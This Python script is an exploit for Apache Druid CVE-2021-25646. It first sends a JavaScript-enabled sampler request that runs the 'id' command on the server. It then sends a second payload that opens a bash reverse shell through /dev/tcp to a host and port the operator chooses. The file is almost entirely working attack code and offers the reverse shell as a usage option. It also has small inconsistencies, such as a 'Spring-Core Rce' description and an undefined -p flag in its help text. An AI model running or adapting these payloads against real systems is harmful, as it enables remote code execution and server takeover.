import requests
import urllib3
import argparse
import re
from time import sleep
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def check_vuln(url):
    data = {
        "type":"index",
        "spec":{
            "ioConfig":{
                "type":"index",
                "firehose":{
                    "type":"local",
                    "baseDir":"/etc",
                    "filter":"passwd"
                }
            },
            "dataSchema":{
                "dataSource":"test",
                "parser":{
                    "parseSpec":{
                    "format":"javascript",
                    "timestampSpec":{

                    },
                    "dimensionsSpec":{

                    },
                    "function":"function(){var a = new java.util.Scanner(java.lang.Runtime.getRuntime().exec([\"sh\",\"-c\",\"id\"]).getInputStream()).useDelimiter(\"\\A\").next();return {timestamp:123123,test: a}}",
                    "":{
                        "enabled":"true"
                    }
                    }
                }
            }
        },
        "samplerConfig":{
            "numRows":10
        }
    }

    if url.endswith('/'):
        url = url[:-1]
        
    url += '/druid/indexer/v1/sampler'
    
    try:
        r = requests.post(url, json=data)
        
        if "uid=" in r.text:
            print("[+] Detected Vulnerability : True")
            print("[*] To Test Reverse Shell, add Argument -sh")
            print("For example, $python3 poc.py -p 8888 -lh {yourip} -lp {yourport} -sh 1")
            print("Default reverse shell ip and port is 127.0.0.1, 1389")
        else:
            print("[-] Detected Vulnerability : False")
    except:
        print("[-] Something wrong......")


    
def get_shell(url, lhost, lport):
    data = {
        "type": "index",
        "spec": {
            "ioConfig": {
                "type": "index",
                "inputSource": {
                    "type": "inline",
                    "data": "{\"isRobot\":true,\"channel\":\"#x\",\"timestamp\":\"2021-2-1T14:12:24.050Z\",\"flags\":\"x\",\"isUnpatrolled\":false,\"page\":\"1\",\"diffUrl\":\"https://xxx.com\",\"added\":1,\"comment\":\"Botskapande Indonesien omdirigering\",\"commentLength\":35,\"isNew\":true,\"isMinor\":false,\"delta\":31,\"isAnonymous\":true,\"user\":\"Lsjbot\",\"deltaBucket\":0,\"deleted\":0,\"namespace\":\"Main\"}"
                },
                "inputFormat": {
                    "type": "json",
                    "keepNullColumns": "true"
                }
            },
            "dataSchema": {
                "dataSource": "sample",
                "timestampSpec": {
                    "column": "timestamp",
                    "format": "iso"
                },
                "dimensionsSpec": {},
                "transformSpec": {
                    "transforms": [],
                    "filter": {
                        "type": "javascript",
                        "dimension": "added",
                        "function": "function(value) {java.lang.Runtime.getRuntime().exec('/bin/bash -c $@|bash 0 echo bash -i >&/dev/tcp/"+lhost+"/"+lport+" 0>&1')}",
                        "": {"enabled": "true"}
                    }
                }
            },
            "type": "index",
            "tuningConfig": {"type": "index"}
        },
        "samplerConfig": {"numRows": 500, "timeoutMs": 15000}
    }
    
    if url.endswith('/'):
        url = url[:-1]
        
    url += '/druid/indexer/v1/sampler'
    
    try:
        r = requests.post(url, json=data)

        print("[+] Try Reverse Shell.....")
    except:
        print("[-] Something wrong......")
    
if __name__ == "__main__":
    print("""
          
    =================================
          Apache Druid
          CVE-2021-25646 Exploit
    =================================
    
          """)
    parser = argparse.ArgumentParser(description='Spring-Core Rce.')
    parser.add_argument('-u', help='target url', required=False)
    parser.add_argument('-sh', help='reverse shell', required=False)
    parser.add_argument('-lh', help='reverse shell host', required=False)
    parser.add_argument('-lp', help='reverse shell port', required=False)
    args = parser.parse_args()
    
    if args.sh is not None:
        get_shell(args.u or "http://127.0.0.1", args.lh or "http://127.0.0.1", args.lp or "1389")
    else:
        check_vuln(args.u or "http://127.0.0.1")